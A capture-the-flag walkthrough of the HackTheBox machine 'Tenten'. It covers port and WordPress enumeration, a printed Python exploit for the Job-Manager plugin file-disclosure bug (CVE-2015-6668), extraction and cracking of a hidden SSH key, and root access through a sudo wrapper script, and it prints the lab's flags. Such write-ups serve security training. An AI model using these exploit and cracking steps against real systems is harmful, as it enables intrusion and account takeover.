---
layout: post
title: HackTheBox Tenten
date: 2017-03-22
tags: [HackTheBox, Linux]
---

# Machine Synopsis

Tenten is a medium difficulty machine that requires some outside-the-box/CTF-style thinking to complete. It demonstrates the severity of using outdated Wordpress plugins, which is a major attack vector that exists in real life. ([Source](https://www.hackthebox.com/machines/tenten))

# Enumeration

```bash
┌──(root㉿shiro)-[/home/shiro]
└─# nmap -sC -sV -A 10.10.10.10
Nmap scan report for 10.10.10.10
Host is up (0.0093s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Job Portal &#8211; Just another WordPress site
|_http-generator: WordPress 4.7.3
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 4.8 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   13.97 ms 10.10.14.1
2   14.05 ms 10.10.10.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.82 seconds
```

Port 80 is open, let’s check out their website!

![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Tenten/website.png?raw=true)

Looking through the website shows us that there is a user called `takis`. 

![user_takis](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Tenten/user_takis.png?raw=true)

Now, let’s run `gobuster`!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Tenten]
└─# gobuster dir -u http://10.10.10.10 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
...
/wp-content           (Status: 301) [Size: 315] [--> http://10.10.10.10/wp-content/]
/wp-includes          (Status: 301) [Size: 316] [--> http://10.10.10.10/wp-includes/]
/wp-admin             (Status: 301) [Size: 313] [--> http://10.10.10.10/wp-admin/]   
/server-status        (Status: 403) [Size: 299]                           ...
```

It seems like there was nothing much found, let’s use `wpscan` instead since it’s a Wordpress website.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Tenten]
└─# wpscan --url http://10.10.10.10                   
...

[i] Plugin(s) Identified:

[+] job-manager
 | Location: http://10.10.10.10/wp-content/plugins/job-manager/
 | Latest Version: 0.7.25 (up to date)
 | Last Updated: 2015-08-25T22:44:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 7.2.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.10/wp-content/plugins/job-manager/readme.txt

...
```

# Exploit

From the `wpscan` result, we can see that the website is using a plugin called `job-manager`. This plugin is vulnerable to CVE-2015-6668. We can exploit this using this [code](https://gist.github.com/DoMINAToR98/4ed677db5832e4b4db41c9fa48e7bdef).

```python
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Tenten]
└─# cat exploit.py 
import requests

print """  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  
"""  
website = raw_input('Enter a vulnerable website: ')  
filename = raw_input('Enter a file name: ')

filename2 = filename.replace(" ", "-")

for year in range(2017,2019):  
    for i in range(1,13):
        for extension in {'jpeg','png','jpg'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print "[+] URL of CV found! " + URL
```

However, we need to find a file name on the website for this exploit code to work. Looking though the website again, there was a job listing page.

![job_listing](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Tenten/job_listing.png?raw=true)

Clicking on Apply Now brings us to this page.

![apply_job](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Tenten/apply_job.png?raw=true)

Notice that the url is `http://10.10.10.10/index.php/jobs/apply/8/`? Changing the id `8` to another integer shows us a different job title.

![apply_job_2](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Tenten/apply_job_2.png?raw=true)

Let’s do some bash scripting to get the possible values of the job titles!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Tenten]
└─# curl -s http://10.10.10.10/index.php/jobs/apply/1/ | grep "entry-title"  
		<h1 class="entry-title">Job Application: Hello world!</h1>			</header><!-- .entry-header -->
		
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Tenten]
└─# curl -s http://10.10.10.10/index.php/jobs/apply/1/ | grep "entry-title" | cut -d ">" -f2 
Job Application: Hello world!</h1

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Tenten]
└─# curl -s http://10.10.10.10/index.php/jobs/apply/1/ | grep "entry-title" | cut -d ">" -f2 | cut -d "<" -f1
Job Application: Hello world!

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Tenten]
└─# for i in {0..25};do echo -n "$i: "; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep "entry-title" | cut -d ">" -f2 | cut -d "<" -f1; done
0: Job Application
1: Job Application: Hello world!
2: Job Application: Sample Page
3: Job Application: Auto Draft
4: Job Application
5: Job Application: Jobs Listing
6: Job Application: Job Application
7: Job Application: Register
8: Job Application: Pen Tester
9: Job Application:
10: Job Application: Application
11: Job Application: cube
12: Job Application: Application
13: Job Application: HackerAccessGranted
14: Job Application
15: Job Application
...
```

There’s an interesting `HackerAccessGranted` title! Apparently, this was the filename for the exploit.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Tenten]
└─# chmod +x exploit.py

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Tenten]
└─# python ./exploit.py
...
Enter a vulnerable website: http://10.10.10.10
Enter a file name: HackerAccessGranted
[+] URL of CV found! http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Tenten]
└─# wget http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
```

![hacker_granted_access_image](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Tenten/hacker_granted_access_image.png?raw=true)

Look’s like there’s nothing much.. or is it? Let’s use `steghide` to check if anything is hidden in the image!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Tenten]
└─# steghide --extract -sf HackerAccessGranted.jpg 
Enter passphrase: 
wrote extracted data to "id_rsa".
```

Without entering a passphrase, `steghide` managed to extract some `id_rsa` data.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Tenten]
└─# cat id_rsa    
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C

/HXcUBOT3JhzblH7uF9Vh7faa76XHIdr/Ch0pDnJunjdmLS/laq1kulQ3/RF/Vax
...
YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP
-----END RSA PRIVATE KEY-----
```

Now that we have some encrypted RSA private key, we have to crack it. We can use `ssh2john` to create a hash of the private key and then crack it with `john`!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Tenten]
└─# ssh2john id_rsa > hashed_id_rsa               

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Tenten]
└─# john hashed_id_rsa --wordlist=/usr/share/wordlists/rockyou.txt 
...
superpassword    (id_rsa)     
```

The password is `superpassword`! Now we can connect to SSH using the credentials found.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Tenten]
└─# chmod 400 id_rsa                 
                           
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Tenten]
└─# ssh -i id_rsa takis@10.10.10.10  
...
takis@tenten:~$ 
```

# Privilege Escalation

```bash
takis@tenten:~$ id
uid=1000(takis) gid=1000(takis) groups=1000(takis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare)
takis@tenten:~$ sudo -l
Matching Defaults entries for takis on tenten:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User takis may run the following commands on tenten:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/fuckin
takis@tenten:~$ cat /bin/fuckin
#!/bin/bash
$1 $2 $3 $4
takis@tenten:~$ fuckin echo test test2 test3
test test2 test3
```

So apparently this user can run `fuckin` as root. The script runs the first argument with the second, third and fourth argument as arguments. We can simply abuse this by running `fuckin bash`.

```bash
takis@tenten:~$ sudo fuckin bash
...
root@tenten:~# id
uid=0(root) gid=0(root) groups=0(root)
root@tenten:~# cat /home/takis/user.txt
8ef36d6f5cc7bf1a84017518d36c6de0
root@tenten:~# cat /root/root.txt 
cfaf23144b976ea8d87504f51796eb4c
```

 
